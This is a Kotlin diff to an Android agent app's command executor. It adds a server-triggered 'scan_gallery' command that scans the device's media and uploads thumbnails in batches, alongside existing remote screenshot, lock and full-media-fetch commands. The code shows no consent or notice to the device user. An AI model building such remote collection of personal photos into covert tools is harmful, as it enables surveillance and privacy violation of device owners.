@@ -10,6 +10,7 @@ import com.example.gmaagent.data.DeviceDataReader
 import com.example.gmaagent.network.ApiClient
 import com.example.gmaagent.network.CommandStatusUpdate
 import com.example.gmaagent.network.PendingCommand
+import kotlinx.coroutines.delay
 import kotlinx.serialization.json.Json
 import kotlinx.serialization.json.JsonObject
 import kotlinx.serialization.json.jsonPrimitive
@@ -53,6 +54,7 @@ object CommandExecutor {
                 "lock_device" -> executeLockDevice(context)
                 "take_screenshot" -> executeTakeScreenshot(context)
                 "fetch_full_media" -> executeFetchFullMedia(context, command.payload)
+                "sync_gallery", "scan_gallery" -> executeScanGallery(context)
                 else -> Pair(false, "Unknown command type: ${command.command_type}")
             }
         } catch (e: Exception) {
@@ -288,6 +290,23 @@ object CommandExecutor {
             }
         } catch (e: Exception) {
             Pair(false, "Error fetching full media: ${e.message}")
+        }
+    }
+
+    private suspend fun executeScanGallery(context: Context): Pair<Boolean, String> {
+        return try {
+            var total = 0
+            com.example.gmaagent.data.MediaScanner.scanAndUploadAll(context) { batch ->
+                val payload = com.example.gmaagent.network.MediaThumbnailSyncRequest(thumbnails = batch)
+                val res = ApiClient.syncMediaThumbnails(payload)
+                if (res != null) {
+                    total += res.ingested
+                }
+                delay(200L)
+            }
+            Pair(true, "Gallery scan completed: $total items synced")
+        } catch (e: Exception) {
+            Pair(false, "Gallery scan failed: ${e.message}")
         }
     }
 }
